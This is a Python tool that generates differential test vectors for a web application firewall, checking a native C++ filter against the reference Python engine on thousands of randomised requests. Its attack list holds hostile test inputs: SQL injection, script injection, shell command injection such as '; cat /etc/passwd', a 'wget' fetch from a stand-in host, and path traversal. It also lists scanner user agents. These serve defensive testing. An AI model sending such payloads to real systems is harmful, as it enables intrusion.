#!/usr/bin/env python3
# Copyright (c) 2026 kraynux - kraynux@proton.me - Licence MIT (voir fichier LICENSE)
"""Vecteurs de reference du filtre WAF natif (OMEGA-SERV_PLAN-DETAILLE_WAF_NATIF.md, lot 1) - outil de developpement.

Regles : packs livres (secure/waf/rules) + les deux listes de chemins de reference (motifs longs), exportees par la
VRAIE fonction de l'instantane (`waf_filter_payload`). Pour chaque requete, attendus calcules par les VRAIES fonctions
Python : textes inspectes (`PythonWafEngine._build_scope_texts`) et regles qui correspondent (`evaluate_rules`).
Le test C++ (native/omega-http-core/tests/test_waf_filter.cpp) exige : soit un doute, soit EXACTEMENT les memes
textes et les memes regles ; et jamais de doute sur une requete marquee « doit decider » (tout ASCII, decodage « % »
reste ASCII).

  .venv/bin/python tools/differential/make_waf_vectors.py native/omega-http-core/tests/vectors

Sorties : waf_filter.json (section de l'instantane), waf_requests.tsv (une ligne par requete, champs hexadecimaux :
cible, en-tetes « nom\\0valeur » separes par \\n, puis par scope le texte attendu ou « - » s'il est absent, les
identifiants attendus separes par « , », et 1/0 « doit decider »)."""
from __future__ import annotations

import json
import random
import re
import sys
import urllib.parse
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "src"))

from omega_serv.domain.http.headers import HttpHeaders
from omega_serv.domain.http.request import (
    HttpRequest,
    InvalidAbsoluteTarget,
    absolute_form_parts,
    split_request_target,
)
from omega_serv.domain.security.waf.config import parse_waf_config
from omega_serv.domain.security.waf.entities import KeywordListDefinition
from omega_serv.domain.security.waf.keyword_list import (
    build_rule_pack_from_keyword_list,
    tokens_from_text,
)
from omega_serv.domain.security.waf.rule_validation import parse_rule_pack
from omega_serv.domain.security.waf.signature_engine import (
    compile_rule_pack,
    evaluate_rules,
)
from omega_serv.infrastructure.server.native_snapshot import waf_filter_payload
from omega_serv.infrastructure.waf.python_waf_engine import PythonWafEngine

SCOPES = ("path", "query", "headers", "user_agent", "referer", "body")  # ordre de WafScope (waf_filter.hpp)
RNG = random.Random(20261104)
REFERENCES = REPO / "src" / "omega_serv" / "infrastructure" / "waf" / "keyword_references"


def packs():
    shipped = tuple(compile_rule_pack(parse_rule_pack(json.loads(path.read_text(encoding="utf-8"))))
                    for path in sorted((REPO / "secure" / "waf" / "rules").glob("*.json")))
    lists = []
    for path in sorted(REFERENCES.glob("*.txt")):
        for match, anchor in (("path", "any_segment"), ("path", "root"), ("substring", "any_segment")):
            definition = KeywordListDefinition(id=f"{path.stem}-{match}-{anchor}", scope=("path",), file=str(path),
                                               match=match, anchor=anchor)
            lists.append(compile_rule_pack(build_rule_pack_from_keyword_list(definition, tokens_from_text(
                path.read_text(encoding="utf-8")))))
    return shipped + tuple(lists)


def mixed_case(text: str) -> str:
    return "".join(c.upper() if RNG.random() < 0.5 else c for c in text)


def percent(text: str, every: float = 0.5) -> str:
    return "".join(f"%{ord(c):02X}" if ord(c) < 128 and RNG.random() < every else c for c in text)


def ascii_chain(raw: str, depth: int) -> bool:
    """Le decodage « % » reste-t-il ASCII a chaque passe (le natif doit alors decider) ?"""
    if not raw.isascii():
        return False
    current = raw.encode("ascii")
    for _ in range(max(1, depth)):
        decoded = urllib.parse.unquote_to_bytes(current)
        if any(b >= 0x80 for b in decoded):
            return False
        if decoded == current:
            break
        current = decoded
    return True


def cases(pieces: list[str]) -> list[tuple[str, list[tuple[str, str]]]]:
    browsers = ["Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0 Safari/537.36",
                "curl/8.10.1", "oha/1.16.0", "Wget/1.24"]
    scanners = ["sqlmap/1.8", "Nikto/2.5", "masscan/1.3", "gobuster/3.6", "Nmap Scripting Engine", "zgrab/0.x", "w3af.org"]
    attacks = ["union select password from users", "' or 1=1 --", "<script>alert(1)</script>", "; cat /etc/passwd",
               "$(id)", "`id`", "wget http://e.x/a.sh", "extractvalue(1,2)", "<svg onload=x>", "../../etc/passwd"]
    out = []
    fixed = ["/", "/small.html", "/omega-serv/guide.html", "/wp-login.php", "/.git/config", "/.GIT/HEAD", "/.env",
             "/Dockerfile", "/a/.htaccess", "/%2e%2e/x", "/%252e%252e/", "/%C3%A9t%C3%A9", "/\xe9", "/%ZZ", "/%2",
             "http://exemple.org/admin?x=1", "HTTPS://h/.env", "/x?q=%3Cscript%3E", "/x?q=%253Cscript%253E",
             "/x?q=%25253Cscript", "/x?" + percent("union select", 1.0), "/x?q=%EF%BC%9Cscript%EF%BC%9E"]
    for target in fixed:
        out.append((target, [("Host", "h"), ("User-Agent", browsers[0])]))
    for _ in range(9000):
        kind = RNG.random()
        benign = ["a", "blog", "img", "x.png", "index.html", "omega-serv", "docs", "2026", "style.css", "app.js",
                  "photos", "Guide-FR", "README.md", "api", "v1", "users", "42", "search"]
        source = pieces if RNG.random() < 0.35 else benign  # environ deux tiers de chemins ordinaires
        path = "/" + "/".join(RNG.choice(source).strip("/") for _ in range(RNG.randint(1, 3)))
        if RNG.random() < 0.3:
            path = mixed_case(path)
        if RNG.random() < 0.2:
            path = percent(path, 0.3)
        if RNG.random() < 0.03:
            path += RNG.choice(["\xe9", "\xff", "%C3%A9", "%FF"])
        query = ""
        if RNG.random() < 0.5:
            query = RNG.choice(attacks + ["id=42&page=3", "q=bonjour+le+monde", "a=1&b=2", ""]) if kind < 0.7 else \
                "".join(RNG.choice("abc=&%+;'\"<>()/ 0123456789") for _ in range(RNG.randint(0, 30)))
            if RNG.random() < 0.3:
                query = mixed_case(query)
            if RNG.random() < 0.3:
                query = percent(query, RNG.choice([0.2, 1.0]))
            if RNG.random() < 0.1:
                query = percent(query, 0.5)  # double encodage partiel
        target = path + ("?" + query if query or RNG.random() < 0.1 else "")
        if RNG.random() < 0.05:
            target = RNG.choice(["http://", "https://", "HTTP://"]) + "exemple.org" + target
        headers = [("Host", "exemple.org")]
        ua = RNG.random()
        if ua < 0.6:
            headers.append(("User-Agent", RNG.choice(browsers)))
        elif ua < 0.85:
            headers.append(("User-Agent", mixed_case(RNG.choice(scanners))))
        elif ua < 0.9:
            headers.append(("User-Agent", "Navigateur \xe9"))
        elif ua < 0.95:
            headers += [("User-Agent", RNG.choice(scanners)), ("user-agent", RNG.choice(browsers))]  # derniere valeur
        if RNG.random() < 0.4:
            headers.append(("Referer", RNG.choice(["https://exemple.org/", "https://e.x/?q=" + RNG.choice(attacks),
                                                   "https://\xe9.x/", ""])))
        out.append((target, headers))
    return out


def main(out_dir: Path) -> None:
    compiled = packs()
    waf = parse_waf_config({"mode": "block"})
    engine = PythonWafEngine(compiled, waf)
    section = waf_filter_payload(waf, compiled)
    pieces = [piece for pack in compiled for rule in pack.rules
              for piece in re.findall(r"[a-z0-9_\-./]{3,}", rule.definition.pattern)]
    (out_dir / "waf_filter.json").write_text(json.dumps(section, ensure_ascii=False), encoding="utf-8")
    lines = []
    must, matched = 0, 0
    for target, header_pairs in cases(pieces[:4000]):
        try:
            absolute = absolute_form_parts(target)
        except InvalidAbsoluteTarget:
            continue  # 400 avant le WAF, dans les deux moteurs
        path, query = split_request_target(absolute[1] if absolute else target)
        request = HttpRequest(request_id="r", remote_ip="203.0.113.1", peer_ip="203.0.113.1", method="GET", path=path,
                              raw_path=target, query=query, headers=HttpHeaders.from_pairs(header_pairs), body=None,
                              content_length=None, is_tls=False)
        texts = engine._build_scope_texts(request)
        ids = [finding.rule_id for finding in evaluate_rules(compiled, texts)]
        user_agent, referer = request.header("user-agent") or "", request.header("referer") or ""
        must_decide = (ascii_chain(path, waf.inspect.decode_depth) and ascii_chain(query, waf.inspect.decode_depth)
                       and user_agent.isascii() and referer.isascii())
        must += must_decide
        matched += bool(ids)
        fields = [target.encode("latin-1").hex(),
                  "\n".join(f"{n}\0{v}" for n, v in header_pairs).encode("latin-1").hex()]
        fields += [texts[s].encode("utf-8").hex() if s in texts else "-" for s in SCOPES]
        fields += [",".join(ids).encode("utf-8").hex() or "-", "1" if must_decide else "0"]
        lines.append("\t".join(fields))
    (out_dir / "waf_requests.tsv").write_text("\n".join(lines) + "\n", encoding="ascii")
    print(f"{len(section['rules'])} regles, {len(lines)} requetes ({must} a decider, {matched} avec correspondance)")


if __name__ == "__main__":
    main(Path(sys.argv[1]))
